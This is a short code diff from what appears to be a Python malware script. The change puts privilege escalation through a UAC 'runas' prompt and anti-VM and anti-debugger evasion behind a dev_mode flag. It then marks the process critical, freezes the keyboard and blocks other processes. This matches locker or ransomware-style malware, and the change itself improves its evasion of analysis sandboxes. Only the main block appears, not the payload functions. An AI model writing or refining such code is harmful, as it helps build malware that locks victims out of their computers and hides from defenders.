@@ -713,14 +713,14 @@ dev_mode = True
 if __name__ == "__main__":
     if not check_connection():
         sys.exit(2)
-    if not is_admin():
-        ctypes.windll.shell32.ShellExecuteW(
-            None, "runas", sys.executable, " ".join(sys.argv), None, 1
-        )
-        sys.exit(0)
-    if not (is_vm() and is_debugger_present()):
-        sys.exit(3)
     if not dev_mode:
+        if not is_admin():
+            ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", sys.executable, " ".join(sys.argv), None, 1
+            )
+            sys.exit(0)
+        if is_vm() or is_debugger_present():
+            sys.exit(3)
         set_process_critical()
         freeze_keyboard()
         block_processes()
